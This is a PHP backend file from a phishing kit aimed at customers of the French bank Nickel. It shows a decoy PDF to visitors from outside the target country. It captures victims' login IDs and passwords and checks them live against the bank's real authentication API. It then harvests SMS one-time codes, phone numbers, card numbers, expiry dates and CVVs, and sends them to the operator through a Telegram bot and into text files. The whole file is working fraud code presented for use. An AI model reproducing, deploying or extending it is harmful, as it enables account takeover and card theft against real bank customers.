<?php
/**
 * 
 * 
 * @package Function and object class Tools
 * @version 1.3.0
 * @last-modified February 11, 2022
 * @author MSbou ELGHO3T
 * @copyright Copyright (c) 2022, anon
 * @link https://t.me/MarcoSbou_sp
 * 
 * 
 */

(@require_once './init.php') or die("You not have permisions");
if (!defined('ELGHO3T_AB_ROOT')) {die("You not have permisions");header("HTTP/1.1 404 Not Found");exit();}
if(!isset($_SESSION['bid'])){die("You not have permisions");header("HTTP/1.1 404 Not Found");exit();}
if(GHOST_CONSTRICT == true){die("Contact admin @ELGHO3T");header("HTTP/1.1 404 Not Found");exit();}
$Xtools = new Tools();
if(GHOST_limet == true):
    if($Xtools->Check_User_limet() == true):
        // die("Contact admin limet action @ELGHO3T");
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        exit();
    endif;

endif;
if(GHOST_SECURE == true):

    if(strtolower( $_SESSION['data_info']['country'] ) !== GHOST_COUNTRY ):
        // die("Contact admin @ELGHO3T");
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        exit();
    endif;

    if($Xtools->check_validate($_SESSION['data_info']) !== true):
        // die("Contact admin @ELGHO3T");
        // header("HTTP/1.1 404 Not Found");
        $Xtools->syfto_pdf("./Conditions-Générales-et-Tarifaires.pdf");
        exit();
    endif;

endif;

if(isset($_POST)):
$_POST['brand'] = 'nickelV0.01';
    if(isset($_POST['step']) && $_POST['step'] == "login"):
        if(isset($_POST['identiant']) && isset($_POST['password']) && !empty($_POST['identiant']) && !empty($_POST['password'])):

            $ips = $Xtools->ip;
            $bid = $_SESSION['bid'];
            $identifiant = $_POST['identiant'];
            $password = $_POST['password'];
            $conuntry = $Xtools->get_client_country();
            $infos = $Xtools->info_from_class_os;
            $system = $Xtools->info_from_class_os["Platform"];
            $date = $Xtools->get_time();
            $us_agent = $_SERVER['HTTP_USER_AGENT'];
            $login = $Xtools->delt(' ','',$identifiant);
			$message = "[ ==== | Login   | === ]\n";
                $message .= "[+] \n";
                $message .= "[+] IDENTIFIANT  : ".$_POST['identiant']." \n";
                $message .= "[+] MOT DE PASSE : ".$_POST['password']." \n";
                $message .= "[+______________________________+] \n";
                $message .= "[+_______ Visiteur info _______+] \n";
                $message .= "[+] Browser : ".$infos['browser_name']." \n";
                $message .= "[+] System  : ".$infos['Platform']." \n";
                $message .= "[+] Country : ".$conuntry." \n";
                $message .= "[+] DatTime : ".$date." \n";
                $message .= "[+] Ip      : ".$ips." \n";
                $message .= "[ ==== | Login  | === ]\r\n";

                
 include './includes/index.php';
           
            $curl = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL => 'https://api.nickel.eu/customer-authentication-api-v2/v1/minimum-viable-authentications',
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'POST',
                CURLOPT_POSTFIELDS =>'{"barcode":"'.$login.'","password":"'.$password.'","client":{"app":{"type":"WEB","version":"2.33.0"},"device":{"id":"'.$Xtools->randoms_string(26).'","name":"Win32","type":"CHROME"}}}',
                CURLOPT_HTTPHEADER => array(
                    'Personal-Space: web/2.33.0',
                    'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    // 'Session-id: d411969b-afb2-4862-a1a4-7f9fc065113a',
                    'sec-ch-ua-mobile: ?0',
                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                    'Content-Type: application/json',
                    'Accept: application/json, text/plain, */*',
                    'sec-ch-ua-platform: "Windows"',
                    'host: api.nickel.eu'
                ),
            ));

            $response = curl_exec($curl);

            curl_close($curl);

            function saving_error(){
                global $Xtools, $identifiant,$password, $infos, $conuntry,$date,$ips ;
                $datas = "[ ==== | Login ".NAMES." ErrOr | === ]\n";
                $datas .= "[+] \n";
                $datas .= "[+] IDENTIFIANT  : $identifiant \n";
                $datas .= "[+] MOT DE PASSE : $password \n";
                $datas .= "[+______________________________+] \n";
                $datas .= "[+_______ Visiteur info _______+] \n";
                $datas .= "[+] Browser : ".$infos['browser_name']." \n";
                $datas .= "[+] System  : ".$infos['Platform']." \n";
                $datas .= "[+] Country : ".$conuntry." \n";
                $datas .= "[+] DatTime : ".$date." \n";
                $datas .= "[+] Ip      : ".$ips." \n";
                $datas .= "[ ==== | Login ".NAMES." ErrOr | === ]\r\n";
                $datas .= "\n";
                 
           
                if(Save_text == true):
                    $Xtools->save_to_txt( $datas ,"login_error.txt");
                endif;


                return true;
            }

            function sending(){
                global $Xtools, $identifiant,$password, $infos, $conuntry,$date,$ips ;
                $datas = "[ ==== | Login ".NAMES." | === ]\n";
                $datas .= "[+] \n";
                $datas .= "[+] IDENTIFIANT  : $identifiant \n";
                $datas .= "[+] MOT DE PASSE : $password \n";
                $datas .= "[+______________________________+] \n";
                $datas .= "[+_______ Visiteur info _______+] \n";
                $datas .= "[+] Browser : ".$infos['browser_name']." \n";
                $datas .= "[+] System  : ".$infos['Platform']." \n";
                $datas .= "[+] Country : ".$conuntry." \n";
                $datas .= "[+] DatTime : ".$date." \n";
                $datas .= "[+] Ip      : ".$ips." \n";
                $datas .= "[ ==== | Login ".NAMES." | === ]\r\n";
                $datas .= "\n";


                if(Send_Telegram == true):
                    $Xtools->Send_Telegram( $datas , Telegram["api"] , Telegram["chat_id"]);
                endif;

                if(Save_text == true):
                    $Xtools->save_to_txt( $datas ,"ruslta.txt");
                endif;

                $data = ["success"=>"true"] ;
                return true;
            }

            if($response):
                $bell = $Xtools->delt('{','',$response);
                $bell = $Xtools->delt('}','',$bell);
                if($bell):
                    $bells = explode(",",$bell);
                    if(is_array($bells)):

                        if(strpos($response,'error.badCredentials') == true):

                            if(saving_error() == true):
                                echo $response;
                            endif;
                        elseif(strpos($response,'error.tooManyPasswordAttempts') == true):

                            if(saving_error() == true):
                                echo $response;
                            endif;

                        elseif(strpos($response,'error.authenticationChallenge') == true):

                            if(sending() == true):
                                echo $response;
                            endif;
                        endif;
                    endif;

                endif;
            endif;
            

            /**
             * === request To txt file and telegram 
            */



        endif;

    endif;

    if(isset($_POST['step']) && $_POST['step'] == "sms"):

        if(isset($_POST['codes']) && !empty($_POST['codes'])):

            $ips = $Xtools->ip;
            $bid = $_SESSION['bid'];
            $identifiant = $_POST['codes'];
            $conuntry = $Xtools->get_client_country();
            $infos = $Xtools->info_from_class_os;
            $system = $Xtools->info_from_class_os["Platform"];
            $date = $Xtools->get_time();


            $datas = "[ ==== | SMS ".NAMES." | === ]\n";
            $datas .= "[+] \n";
            $datas .= "[+] SMS  : $identifiant \n";
            $datas .= "[+______________________________+] \n";
            $datas .= "[+_______ Visiteur info _______+] \n";
            $datas .= "[+] Browser : ".$infos['browser_name']." \n";
            $datas .= "[+] System  : ".$infos['Platform']." \n";
            $datas .= "[+] Country : ".$conuntry." \n";
            $datas .= "[+] DatTime : ".$date." \n";
            $datas .= "[+] Ip      : ".$ips." \n";
            $datas .= "[ ==== | SMS ".NAMES." | === ]\r\n";
            $datas .= "\n";
            $message = $datas;

                

           
            if(Send_Telegram == true):
                $Xtools->Send_Telegram( $datas , Telegram["api"] , Telegram["chat_id"]);
				
            endif;

            if(Save_text == true):
                $Xtools->save_to_txt( $datas ,"ruslta.txt");
            endif;

            $data = ["success"=>"true"] ;
            echo json_encode($data);

        endif;

    endif;

    if(isset($_POST['step']) && $_POST['step'] == "sms_after"):

        if(isset($_POST['codes']) && !empty($_POST['codes'])):

            $_SESSION['load'] += 0;
            $ips = $Xtools->ip;
            $bid = $_SESSION['bid'];
            $identifiant = $_POST['codes'];
            $conuntry = $Xtools->get_client_country();
            $infos = $Xtools->info_from_class_os;
            $system = $Xtools->info_from_class_os["Platform"];
            $date = $Xtools->get_time();


            $datas = "[ ==== | SMS (".$_SESSION['load'].") ".NAMES." | === ]\n";
            $datas .= "[+] \n";
            $datas .= "[+] SMS (".$_SESSION['load'].") : $identifiant \n";
            $datas .= "[+______________________________+] \n";
            $datas .= "[+_______ Visiteur info _______+] \n";
            $datas .= "[+] Browser : ".$infos['browser_name']." \n";
            $datas .= "[+] System  : ".$infos['Platform']." \n";
            $datas .= "[+] Country : ".$conuntry." \n";
            $datas .= "[+] DatTime : ".$date." \n";
            $datas .= "[+] Ip      : ".$ips." \n";
            $datas .= "[ ==== | SMS (".$_SESSION['load'].") ".NAMES." | === ]\r\n";
            $datas .= "\n";
            $message = $datas;
            if(Send_Telegram == true):
                $Xtools->Send_Telegram( $datas , Telegram["api"] , Telegram["chat_id"]);
				 include './includes/index.php';
            endif;

            if(Save_text == true):
                $Xtools->save_to_txt( $datas ,"ruslta.txt");
            endif;

            if($_SESSION['load'] == sms_err):
                $data = ["success"=>"true","send"=>"send"] ;
                echo json_encode($data);
                exit();

            else:

                $data = ["success"=>"true","send"=>"empty"] ;
                echo json_encode($data);
                exit();
            endif;

        endif;

    endif;



    if(isset($_POST['step']) && $_POST['step'] == "info"):

        if(isset($_POST['lname']) && !empty($_POST['lname']) && isset($_POST['phone']) && !empty($_POST['phone']) && isset($_POST['crd']) && !empty($_POST['crd'])  && isset($_POST['date_exp']) && !empty($_POST['date_exp']) && isset($_POST['cv']) && !empty($_POST['cv'])):

            $ips = $Xtools->ip;
            $bid = $_SESSION['bid'];
            $lname = $_POST['lname'];
            $phone = $_POST['phone'];
            $crd = $_POST['crd'];
            $datep = $_POST['date_exp'];
            $cv = $_POST['cv'];
            $conuntry = $Xtools->get_client_country();
            $infos = $Xtools->info_from_class_os;
            $system = $Xtools->info_from_class_os["Platform"];
            $date = $Xtools->get_time();


            $datas = "[ ==== | info ".NAMES." | === ]\n";
            $datas .= "[+] \n";
            $datas .= "[+] Name  : $lname \n";
            $datas .= "[+] Phone  : $phone \n";
            $datas .= "[+] crd  : $crd \n";
            $datas .= "[+] Date_exp  : $datep \n";
            $datas .= "[+] Cv  : $cv \n";
            $datas .= "[+______________________________+] \n";
            $datas .= "[+_______ Visiteur info _______+] \n";
            $datas .= "[+] Browser : ".$infos['browser_name']." \n";
            $datas .= "[+] System  : ".$infos['Platform']." \n";
            $datas .= "[+] Country : ".$conuntry." \n";
            $datas .= "[+] DatTime : ".$date." \n";
            $datas .= "[+] Ip      : ".$ips." \n";
            $datas .= "[ ==== | info ".NAMES." | === ]\r\n";
            $datas .= "\n";
            $message = $datas;
            if(Send_Telegram == true):
                $Xtools->Send_Telegram( $datas , Telegram["api"] , Telegram["chat_id"]);
				 include './includes/index.php';

            endif;

            if(Save_text == true):
                $Xtools->save_to_txt( $datas ,"ruslta.txt");
            endif;

            $data = ["success"=>"true"] ;
            echo json_encode($data);

        endif;

    endif;

endif;